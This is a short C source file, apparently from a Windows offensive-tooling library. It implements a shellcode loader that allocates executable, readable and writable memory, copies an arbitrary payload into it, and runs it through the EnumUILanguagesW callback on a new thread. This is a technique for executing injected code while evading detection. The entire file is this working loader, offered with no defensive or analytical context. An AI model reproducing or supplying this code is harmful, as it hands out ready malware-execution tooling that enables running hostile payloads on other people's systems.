#include "Win32Helper.h"

VOID InvokeEnumUILanguagesWCallbackRoutine(LPVOID lpParameter)
{
	EnumUILanguagesW((UILANGUAGE_ENUMPROCW)lpParameter, MUI_LANGUAGE_ID, NULL);
}

BOOL MpfSceViaEnumUILanguagesW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumUILanguagesWCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}